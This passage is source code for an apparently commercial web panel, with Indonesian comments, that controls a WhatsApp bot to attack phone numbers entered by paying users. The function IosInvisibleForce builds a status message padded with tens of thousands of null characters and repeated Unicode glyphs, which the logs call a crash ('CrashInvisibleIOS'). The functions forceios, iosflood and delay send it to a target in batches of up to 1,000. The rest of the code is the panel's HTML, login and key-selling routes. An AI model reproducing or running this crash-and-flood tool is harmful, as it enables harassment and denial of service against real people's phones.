        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade SATNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}
async function delay(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
          delayNew(sat, X),
          Blank(sat, X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 900);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade SATNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// -------------------( IOS FUNC )------------------------------ \\
async function IosInvisibleForce(sat, X) {
  const msg = {
    key: { // tambahkan bagian key biar ada id
      remoteJid: "status@broadcast",
      fromMe: true,
      id: sat.generateMessageTag ? sat.generateMessageTag() : (Date.now().toString()) 
    },
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" 
              + "\u0000".repeat(60000) 
              + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://t.me/rizxvelzdev",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  }

  await sat.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id, // sekarang tidak undefined
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  })

  console.log(chalk.red(`─────「 ⏤!CrashInvisibleIOS To: ${X}!⏤ 」─────`))
}


async function forceios(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
        await IosInvisibleForce(sat, X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1000 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Matrix 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
         IosInvisibleForce(sat,X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1000 FORCE IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade SATNIX 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

const executionPage = (
  status = "🟪 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta content='width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;' name='viewport' />
<meta name="viewport" content="width=device-width" />
  <title>SATANIX-API</title>
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Poppins', sans-serif;
  background: url("/satan.jpg") no-repeat center center fixed;
  background-size: cover;
  color: white;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
  overflow: hidden;
  position: relative;
}

#webcoderskull {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 0;
}

canvas {
  display: block;
  width: 100%;
  height: 100%;
  background: transparent;
}

#webcoderskull h1 {
  letter-spacing: 5px;
  font-size: 5rem;
  font-family: 'Roboto', sans-serif;
  text-transform: uppercase;
  font-weight: bold;
}

.container {
  z-index: 1;
  background: rgba(0, 0, 0, 0.75);
  border: 1px solid #ff3d3d;
  padding: 24px;
  border-radius: 20px;
  max-width: 420px;
  width: 100%;
  box-shadow: 0 0 20px #ff3d3d, 0 0 40px #ff450033;
  backdrop-filter: blur(10px);
  position: relative;
}

.logo {
  width: 80px;
  height: 80px;
  margin: 0 auto 12px;
  display: block;
  border-radius: 50%;
  box-shadow: 0 0 16px #ff3d3d;
  object-fit: cover;
}

.username {
  font-size: 22px;
  color: #ffffff;
  font-weight: 600;
  text-align: center;
  margin-bottom: 6px;
}

.connected,
.disconnected {
  font-size: 14px;
  margin-bottom: 16px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.connected::before,
.disconnected::before {
  content: '';
  width: 10px;
  height: 10px;
  border-radius: 50%;
  display: inline-block;
  margin-right: 8px;
}

/* Warna CONNECTED */
.connected {
  color: #4caf50; /* hijau */
}
.connected::before {
  background: #4caf50;
}

/* Warna NOT CONNECTED */
.disconnected {
  color: #ff3d3d; /* merah */
}
.disconnected::before {
  background: #ff3d3d;
}

input[type="text"] {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  background: #1a0000;
  border: none;
  color: white;
  margin-bottom: 16px;
}

.buttons-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
  margin-bottom: 16px;
}

.buttons-grid button {
  padding: 2px;
  border: none;
  border-radius: 15px;
  background: #330000;
  color: #ff3d3d;
  font-weight: bold;
  cursor: pointer;
  transition: 0.3s;
}

.buttons-grid button.selected {
  background: #ff3d3d;
  color: #000;
}

.execute-button {
  background: #ff3d3d;
  color: #fff;
  padding: 14px;
  width: 100%;
  border-radius: 10px;
  font-weight: bold;
  border: none;
  margin-bottom: 12px;
  cursor: pointer;
  transition: 0.3s;
}

.execute-button:disabled {
  background: #4d0000;
  cursor: not-allowed;
  opacity: 0.5;
}

.execute-button:hover:not(:disabled) {
  background: #ff6666;
}

.footer-action-container {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  gap: 8px;
  margin-top: 20px;
}

.footer-button {
  background: rgba(255, 0, 0, 0.15);
  border: 1px solid #ff3d3d;
  border-radius: 8px;
  padding: 8px 12px;
  font-size: 14px;
  color: #ff3d3d;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: background 0.3s ease;
}

.footer-button:hover {
  background: rgba(139, 0, 0, 0.3);
}

.footer-button a {
  text-decoration: none;
  color: #ff3d3d;
  display: flex;
  align-items: center;
  gap: 6px;
}

.buttons-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
  gap: 12px;
  margin-top: 20px;
}

.mode-btn {
  font-size: 14px;
  font-weight: 600;
  padding: 12px 16px;
  background-color: #1a0000;
  color: #ffffff;
  border: 2px solid #ff3d3d33;
  border-radius: 10px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: background-color 0.2s ease, transform 0.2s ease;
}

.mode-btn i {
  font-size: 18px;
}

.mode-btn:hover {
  background-color: #330000;
  transform: scale(1.03);
}

.mode-btn.full {
  grid-column: span 2;
}

@media (max-width: 500px) {
  .mode-btn.full {
    grid-column: span 1;
  }
}
</style>
</head>
<body>
  <div id="particles">
  <div id="webcoderskull">
  <div class="container">
    <img src="/satan.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome, ${username || 'Anonymous'}</div>
    <div id="botStatus" class="disconnected">NOT CONNECTED</div>

    <input type="text" placeholder="Input target number (62xxxx)" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fa fa-fire" aria-hidden="true"></i>ANDRO FC</button>
      <button class="mode-btn" data-mode="androse"><i class="fa fa-ntion" aria-hidden="true"></i>ANDRO DELAY</button>
      <button class="mode-btn" data-mode="ios"><i class="fa fa-tint" aria-hidden="true"></i>IOS SYSTEM </button>
      <button class="mode-btn full" data-mode="fcios"><i class="fa fa-bolt" aria-hidden="true"></i>BLONDE VINTAGE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> EXECUTE</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/SatanixcaL" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>
</div>
  </div>
  <script>
  async function updateBotStatus() {
    try {
      const res = await fetch('/status');
      const data = await res.json();
      const statusEl = document.getElementById('botStatus');

      if (data.connected) {
        statusEl.classList.add('online');
        statusEl.textContent = 'CONNECTED';
      } else {
        statusEl.classList.remove('online');
        statusEl.textContent = 'NOT CONNECTED';
      }
    } catch (err) {
      console.error('Gagal cek status:', err);
    }
  }

  // Update setiap 5 detik
  setInterval(updateBotStatus, 5000);
  updateBotStatus();
</script>
  <script> /*!
 * Particleground
 *
 */
 document.addEventListener('DOMContentLoaded', function () {
  particleground(document.getElementById('particles'), {
    dotColor: '#ffffffff',
    lineColor: '#e11010ff'
  });
  var intro = document.getElementById('intro');
  intro.style.marginTop = - intro.offsetHeight / 2 + 'px';
}, false);



;(function(window, document) {
  "use strict";
  var pluginName = 'particleground';

  function extend(out) {
    out = out || {};
    for (var i = 1; i < arguments.length; i++) {
      var obj = arguments[i];
      if (!obj) continue;
      for (var key in obj) {
        if (obj.hasOwnProperty(key)) {
          if (typeof obj[key] === 'object')
            deepExtend(out[key], obj[key]);
          else
            out[key] = obj[key];
        }
      }
    }
    return out;
  };

  var $ = window.jQuery;

  function Plugin(element, options) {
    var canvasSupport = !!document.createElement('canvas').getContext;
    var canvas;
    var ctx;
    var particles = [];
    var raf;
    var mouseX = 0;
    var mouseY = 0;
    var winW;
    var winH;
    var desktop = !navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|BB10|mobi|tablet|opera mini|nexus 7)/i);
    var orientationSupport = !!window.DeviceOrientationEvent;
    var tiltX = 0;
    var pointerX;
    var pointerY;
    var tiltY = 0;
    var paused = false;

    options = extend({}, window[pluginName].defaults, options);

    /**
     * Init
     */
    function init() {
      if (!canvasSupport) { return; }

      //Create canvas
      canvas = document.createElement('canvas');
      canvas.className = 'pg-canvas';
      canvas.style.display = 'block';
      element.insertBefore(canvas, element.firstChild);
      ctx = canvas.getContext('2d');
      styleCanvas();

      // Create particles
      var numParticles = Math.round((canvas.width * canvas.height) / options.density);
      for (var i = 0; i < numParticles; i++) {
        var p = new Particle();
        p.setStackPos(i);
        particles.push(p);
      };

      window.addEventListener('resize', function() {
        resizeHandler();
      }, false);

      document.addEventListener('mousemove', function(e) {
        mouseX = e.pageX;
        mouseY = e.pageY;
      }, false);

      if (orientationSupport && !desktop) {
        window.addEventListener('deviceorientation', function () {
          // Contrain tilt range to [-30,30]
          tiltY = Math.min(Math.max(-event.beta, -30), 30);
          tiltX = Math.min(Math.max(-event.gamma, -30), 30);
        }, true);
      }

      draw();
      hook('onInit');
    }

    /**
     * Style the canvas
     */
    function styleCanvas() {
      canvas.width = element.offsetWidth;
      canvas.height = element.offsetHeight;
      ctx.fillStyle = options.dotColor;
      ctx.strokeStyle = options.lineColor;
      ctx.lineWidth = options.lineWidth;
    }

    /**
     * Draw particles
     */
    function draw() {
      if (!canvasSupport) { return; }

      winW = window.innerWidth;
      winH = window.innerHeight;

      // Wipe canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      // Update particle positions
      for (var i = 0; i < particles.length; i++) {
        particles[i].updatePosition();
      };
      // Draw particles
      for (var i = 0; i < particles.length; i++) {
        particles[i].draw();
      };

      // Call this function next time screen is redrawn
      if (!paused) {
        raf = requestAnimationFrame(draw);
      }
    }

    /**
     * Add/remove particles.
     */
    function resizeHandler() {
      // Resize the canvas
      styleCanvas();

      var elWidth = element.offsetWidth;
      var elHeight = element.offsetHeight;

      // Remove particles that are outside the canvas
      for (var i = particles.length - 1; i >= 0; i--) {
        if (particles[i].position.x > elWidth || particles[i].position.y > elHeight) {
          particles.splice(i, 1);
        }
      };

      // Adjust particle density
      var numParticles = Math.round((canvas.width * canvas.height) / options.density);
      if (numParticles > particles.length) {
        while (numParticles > particles.length) {
          var p = new Particle();
          particles.push(p);
        }
      } else if (numParticles < particles.length) {
        particles.splice(numParticles);
      }

      // Re-index particles
      for (i = particles.length - 1; i >= 0; i--) {
        particles[i].setStackPos(i);
      };
    }

    /**
     * Pause particle system
     */
    function pause() {
      paused = true;
    }

    /**
     * Start particle system
     */
    function start() {
      paused = false;
      draw();
    }

    /**
     * Particle
     */
    function Particle() {
      this.stackPos;
      this.active = true;
      this.layer = Math.ceil(Math.random() * 3);
      this.parallaxOffsetX = 0;
      this.parallaxOffsetY = 0;
      // Initial particle position
      this.position = {
        x: Math.ceil(Math.random() * canvas.width),
        y: Math.ceil(Math.random() * canvas.height)
      }
      // Random particle speed, within min and max values
      this.speed = {}
      switch (options.directionX) {
        case 'left':
          this.speed.x = +(-options.maxSpeedX + (Math.random() * options.maxSpeedX) - options.minSpeedX).toFixed(2);
          break;
        case 'right':
          this.speed.x = +((Math.random() * options.maxSpeedX) + options.minSpeedX).toFixed(2);
          break;
        default:
          this.speed.x = +((-options.maxSpeedX / 2) + (Math.random() * options.maxSpeedX)).toFixed(2);
          this.speed.x += this.speed.x > 0 ? options.minSpeedX : -options.minSpeedX;
          break;
      }
      switch (options.directionY) {
        case 'up':
          this.speed.y = +(-options.maxSpeedY + (Math.random() * options.maxSpeedY) - options.minSpeedY).toFixed(2);
          break;
        case 'down':
          this.speed.y = +((Math.random() * options.maxSpeedY) + options.minSpeedY).toFixed(2);
          break;
        default:
          this.speed.y = +((-options.maxSpeedY / 2) + (Math.random() * options.maxSpeedY)).toFixed(2);
          this.speed.x += this.speed.y > 0 ? options.minSpeedY : -options.minSpeedY;
          break;
      }
    }

    /**
     * Draw particle
     */
    Particle.prototype.draw = function() {
  // === Titik Partikel ===
  ctx.save();
  ctx.shadowColor = '#ff1aee';      // Warna glow ungu
  ctx.shadowBlur = 8;               // Intensitas blur
  ctx.shadowOffsetX = 0;
  ctx.shadowOffsetY = 0;

  ctx.beginPath();
  ctx.arc(
    this.position.x + this.parallaxOffsetX,
    this.position.y + this.parallaxOffsetY,
    options.particleRadius / 2,
    0,
    Math.PI * 2,
    true
  );
  ctx.closePath();
  ctx.fill();
  ctx.restore();

  // === Garis Antar Partikel ===
  ctx.save();
  ctx.shadowColor = '#ff1aee';
  ctx.shadowBlur = 8;
  ctx.shadowOffsetX = 0;
  ctx.shadowOffsetY = 0;

  ctx.beginPath();
  for (var i = particles.length - 1; i > this.stackPos; i--) {
    var p2 = particles[i];

    // Hitung jarak antar titik (Pythagoras)
    var a = this.position.x - p2.position.x;
    var b = this.position.y - p2.position.y;
    var dist = Math.sqrt((a * a) + (b * b)).toFixed(2);

    if (dist < options.proximity) {
      ctx.moveTo(
        this.position.x + this.parallaxOffsetX,
        this.position.y + this.parallaxOffsetY
      );

      if (options.curvedLines) {
        ctx.quadraticCurveTo(
          Math.max(p2.position.x, p2.position.x),
          Math.min(p2.position.y, p2.position.y),
          p2.position.x + p2.parallaxOffsetX,
          p2.position.y + p2.parallaxOffsetY
        );
      } else {
        ctx.lineTo(
          p2.position.x + p2.parallaxOffsetX,
          p2.position.y + p2.parallaxOffsetY
        );
      }
    }
  }
  ctx.stroke();
  ctx.closePath();
  ctx.restore();
};


    /**
     * update particle position
     */
    Particle.prototype.updatePosition = function() {
      if (options.parallax) {
        if (orientationSupport && !desktop) {
          // Map tiltX range [-30,30] to range [0,winW]
          var ratioX = (winW - 0) / (30 - -30);
          pointerX = (tiltX - -30) * ratioX + 0;
          // Map tiltY range [-30,30] to range [0,winH]
          var ratioY = (winH - 0) / (30 - -30);
          pointerY = (tiltY - -30) * ratioY + 0;
        } else {
          pointerX = mouseX;
          pointerY = mouseY;
        }
        // Calculate parallax offsets
        this.parallaxTargX = (pointerX - (winW / 2)) / (options.parallaxMultiplier * this.layer);
        this.parallaxOffsetX += (this.parallaxTargX - this.parallaxOffsetX) / 10; // Easing equation
        this.parallaxTargY = (pointerY - (winH / 2)) / (options.parallaxMultiplier * this.layer);
        this.parallaxOffsetY += (this.parallaxTargY - this.parallaxOffsetY) / 10; // Easing equation
      }

      var elWidth = element.offsetWidth;
      var elHeight = element.offsetHeight;

      switch (options.directionX) {
        case 'left':
          if (this.position.x + this.speed.x + this.parallaxOffsetX < 0) {
            this.position.x = elWidth - this.parallaxOffsetX;
          }
          break;
        case 'right':
          if (this.position.x + this.speed.x + this.parallaxOffsetX > elWidth) {
            this.position.x = 0 - this.parallaxOffsetX;
          }
          break;
        default:
          // If particle has reached edge of canvas, reverse its direction
          if (this.position.x + this.speed.x + this.parallaxOffsetX > elWidth || this.position.x + this.speed.x + this.parallaxOffsetX < 0) {
            this.speed.x = -this.speed.x;
          }
          break;
      }

      switch (options.directionY) {
        case 'up':
          if (this.position.y + this.speed.y + this.parallaxOffsetY < 0) {
            this.position.y = elHeight - this.parallaxOffsetY;
          }
          break;
        case 'down':
          if (this.position.y + this.speed.y + this.parallaxOffsetY > elHeight) {
            this.position.y = 0 - this.parallaxOffsetY;
          }
          break;
        default:
          // If particle has reached edge of canvas, reverse its direction
          if (this.position.y + this.speed.y + this.parallaxOffsetY > elHeight || this.position.y + this.speed.y + this.parallaxOffsetY < 0) {
            this.speed.y = -this.speed.y;
          }
          break;
      }

      // Move particle
      this.position.x += this.speed.x;
      this.position.y += this.speed.y;
    }

    /**
     * Setter: particle stacking position
     */
    Particle.prototype.setStackPos = function(i) {
      this.stackPos = i;
    }

    function option (key, val) {
      if (val) {
        options[key] = val;
      } else {
        return options[key];
      }
    }

    function destroy() {
      console.log('destroy');
      canvas.parentNode.removeChild(canvas);
      hook('onDestroy');
      if ($) {
        $(element).removeData('plugin_' + pluginName);
      }
    }

    function hook(hookName) {
      if (options[hookName] !== undefined) {
        options[hookName].call(element);
      }
    }

    init();

    return {
      option: option,
      destroy: destroy,
      start: start,
      pause: pause
    };
  }

  window[pluginName] = function(elem, options) {
    return new Plugin(elem, options);
  };

  window[pluginName].defaults = {
    minSpeedX: 0.1,
    maxSpeedX: 0.7,
    minSpeedY: 0.1,
    maxSpeedY: 0.7,
    directionX: 'center', // 'center', 'left' or 'right'. 'center' = dots bounce off edges
    directionY: 'center', // 'center', 'up' or 'down'. 'center' = dots bounce off edges
    density: 10000, // How many particles will be generated: one particle every n pixels
    dotColor: '#666666',
    lineColor: '#666666',
    particleRadius: 7, // Dot size
    lineWidth: 1,
    curvedLines: false,
    proximity: 100, // How close two dots need to be before they join
    parallax: true,
    parallaxMultiplier: 5, // The lower the number, the more extreme the parallax effect
    onInit: function() {},
    onDestroy: function() {}
  };

  // nothing wrong with hooking into jQuery if it's there...
  if ($) {
    $.fn[pluginName] = function(options) {
      if (typeof arguments[0] === 'string') {
        var methodName = arguments[0];
        var args = Array.prototype.slice.call(arguments, 1);
        var returnVal;
        this.each(function() {
          if ($.data(this, 'plugin_' + pluginName) && typeof $.data(this, 'plugin_' + pluginName)[methodName] === 'function') {
            returnVal = $.data(this, 'plugin_' + pluginName)[methodName].apply(this, args);
          }
        });
        if (returnVal !== undefined){
          return returnVal;
        } else {
          return this;
        }
      } else if (typeof options === "object" || !options) {
        return this.each(function() {
          if (!$.data(this, 'plugin_' + pluginName)) {
            $.data(this, 'plugin_' + pluginName, new Plugin(this, options));
          }
        });
      }
    };
  }

})(window, document);

(function() {
    var lastTime = 0;
    var vendors = ['ms', 'moz', 'webkit', 'o'];
    for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
      window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame'];
      window.cancelAnimationFrame = window[vendors[x]+'CancelAnimationFrame']
                                 || window[vendors[x]+'CancelRequestAnimationFrame'];
    }

    if (!window.requestAnimationFrame)
      window.requestAnimationFrame = function(callback, element) {
        var currTime = new Date().getTime();
        var timeToCall = Math.max(0, 16 - (currTime - lastTime));
        var id = window.setTimeout(function() { callback(currTime + timeToCall); },
          timeToCall);
        lastTime = currTime + timeToCall;
        return id;
      };

    if (!window.cancelAnimationFrame)
      window.cancelAnimationFrame = function(id) {
        clearTimeout(id);
      };
}());
</script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
const inputField = document.querySelector('input[type="text"]');
const modeButtons = document.querySelectorAll('.mode-btn');
const executeBtn = document.getElementById('executeBtn');
let selectedMode = null;

modeButtons.forEach(function(button) {
  button.addEventListener('click', function() {
    modeButtons.forEach(function(btn) { btn.classList.remove('selected'); });
    button.classList.add('selected');
    selectedMode = button.getAttribute('data-mode');
    executeBtn.disabled = false;
  });
});

executeBtn.addEventListener('click', function() {
  var number = inputField.value.trim();

  // 🔍 Cek status bot sebelum kirim
  fetch('/status')
    .then(res => res.json())
    .then(data => {
      if (!data.connected) {
        Swal.fire({
          icon: 'error',
          title: 'Bot belum terhubung',
          text: 'Pastikan ada bot WhatsApp yang aktif.',
        });
        return;
      }

      // ✅ Kalau bot connect → success
      Swal.fire({
        icon: 'success',
        title: 'Success',
        text: 'Mode: ' + selectedMode.toUpperCase() + ' | Target: ' + number,
        showConfirmButton: false,
        timer: 1500
      }).then(function() {
        window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
      });
    })
    .catch(() => {
      Swal.fire({
        icon: 'error',
        title: 'Gagal memeriksa status bot',
        text: 'Terjadi kesalahan saat menghubungi server.',
      });
    });
});
</script>
</body>
</html>`;
};

app.get('/status', (req, res) => {
  const sessionPath = path.join(__dirname, 'auth');
  let connected = false;

  if (fs.existsSync(sessionPath)) {
    const files = fs.readdirSync(sessionPath);
    connected = files.length > 0;
  }

  res.json({ connected });
});


// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    res.send(html);
  });
});

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');

  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

app.post("/auth", (req, res) => {
  const { username, key, deviceId } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);

  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  if (Date.now() > user.expired) {
    return res.redirect("/login?msg=" + encodeURIComponent("Key sudah expired!"));
  }

  if (user.deviceId && user.deviceId !== deviceId) {
    return res.redirect("/login?msg=" + encodeURIComponent("Perangkat tidak dikenali!"));
  }

  if (!user.deviceId) {
    user.deviceId = deviceId;
    saveUsers(users);
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });

  // 🔹 Role yang bisa akses dashboard
  const dashboardRoles = ["owner", "admin", "vip"];
  if (dashboardRoles.includes(user.role)) {
    return res.redirect("/dashboard");
  }

  res.redirect("/execution");
});


function generateKey(length = 4) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function convertDaysToTimestamp(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

app.post("/add-user", express.urlencoded({ extended: true }), (req, res) => {
  const sessionUser = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === sessionUser);

  if (!currentUser) {
    return res.status(403).send("Akses ditolak");
  }

  const { username, role, expired } = req.body;

  // 🔹 Role yang boleh dibuat sesuai role login
  let allowedRoles = [];
  if (currentUser.role === "owner") {
    allowedRoles = ["admin", "vip", "user"];
  } else if (currentUser.role === "admin") {
    allowedRoles = ["vip", "user"];
  } else if (currentUser.role === "vip") {
    allowedRoles = ["user"];
  } else {
    return res.status(403).send("Akses ditolak");
  }

  // Validasi role yang dikirim
  if (!allowedRoles.includes(role)) {
    return res.status(400).send("Role tidak valid untuk kamu");
  }

  const key = generateKey();
  const expiredTimestamp = convertDaysToTimestamp(Number(expired));

  users.push({
    username,
    key,
    role,
    expired: expiredTimestamp,
    deviceId: ""
  });

  saveUsers(users);
  res.redirect("/dashboard");
});


// Edit User
app.post("/edit-user", express.json(), (req, res) => {
  const sessionUser = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === sessionUser);
  if (!currentUser) return res.status(403).send("Akses ditolak");

  let { index, username, role, expired, deviceId } = req.body;
  index = Number(index);

  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  // 🔹 Role yang boleh diedit sesuai role login
  let allowedRoles = [];
  if (currentUser.role === "owner") {
    allowedRoles = ["owner", "admin", "vip", "user"];
  } else if (currentUser.role === "admin") {
    allowedRoles = ["vip", "user"];
  } else if (currentUser.role === "vip") {
    allowedRoles = ["user"];
  }

  if (!allowedRoles.includes(role)) {
    return res.status(400).send("Role tidak valid untuk kamu");
  }

  let newExpired = Number(expired);
  if (newExpired < 1000000000000) {
    newExpired = Date.now() + newExpired * 24 * 60 * 60 * 1000;
  }

  users[index] = {
    ...users[index],
    username,
    role,
    expired: newExpired,
    deviceId
  };

  saveUsers(users);
  res.sendStatus(200);
});

// Hapus User
app.post("/delete-user", express.json(), (req, res) => {
  let { index } = req.body;
  index = Number(index);

  const users = getUsers();
  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  const username = req.cookies.sessionUser; // User yang login sekarang
  const currentUser = users.find(u => u.username === username);
  const targetUser = users[index];

  if (!currentUser) return res.status(403).send("Session tidak valid");

  // Aturan hapus
  if (currentUser.role === "vip" && (targetUser.role === "owner" || targetUser.role === "admin")) {
    return res.status(403).send("❌ VIP tidak boleh menghapus Owner/Admin");
  }
  if (currentUser.role === "admin" && targetUser.role === "owner") {
    return res.status(403).send("❌ Admin tidak boleh menghapus Owner");
  }

